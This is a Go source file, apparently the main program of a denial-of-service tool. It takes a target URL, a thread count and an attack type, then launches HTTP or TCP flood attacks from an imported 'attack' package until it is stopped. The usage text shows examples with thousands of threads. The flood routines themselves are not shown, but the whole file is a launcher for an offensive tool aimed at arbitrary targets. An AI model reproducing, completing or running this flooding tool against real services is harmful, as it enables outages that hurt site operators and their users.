package main

import (
	"flag"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"

	"cybertool/attack"
)

func main() {
	url := flag.String("u", "", "Target URL (required)")
	threads := flag.Int("t", 100, "Number of threads (default: 100)")
	attackType := flag.String("c", "http", "Attack type: http or tcp (default: http)")
	port := flag.Int("p", 80, "Target port for TCP flood (default: 80)")
	flag.Usage = func() {
		fmt.Fprintf(os.Stderr, "Usage: %s -u <url> -t <threads> [-c <type>] [-p <port>]\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Example: %s -u https://example.com -t 10000\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "Example: %s -u tcp://example.com -t 5000 -c tcp -p 443\n", os.Args[0])
		flag.PrintDefaults()
	}
	flag.Parse()

	if *url == "" {
		fmt.Println("[-] Error: URL is required. Use -u flag.")
		flag.Usage()
		os.Exit(1)
	}

	if *threads <= 0 {
		fmt.Println("[-] Error: Threads must be greater than 0.")
		os.Exit(1)
	}

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)

	switch strings.ToLower(*attackType) {
	case "http", "1":
		if !strings.HasPrefix(*url, "http://") && !strings.HasPrefix(*url, "https://") {
			fmt.Println("[-] Invalid URL format. Must start with http:// or https://")
			os.Exit(1)
		}
		fmt.Printf("[+] Starting HTTP Flood Attack on %s with %d threads\n", *url, *threads)
		go attack.HttpFlood(*url, *threads)
	case "tcp", "2":
		fmt.Printf("[+] Starting TCP Flood Attack on %s:%d with %d threads\n", *url, *port, *threads)
		go attack.TcpFlood(*url, *port, *threads)
	default:
		fmt.Println("[-] Invalid attack type. Use 'http' or 'tcp'.")
		os.Exit(1)
	}

	fmt.Println("[+] Press CTRL+C to stop.")
	<-stop
	fmt.Println("\n[+] Stopping attack...")
}
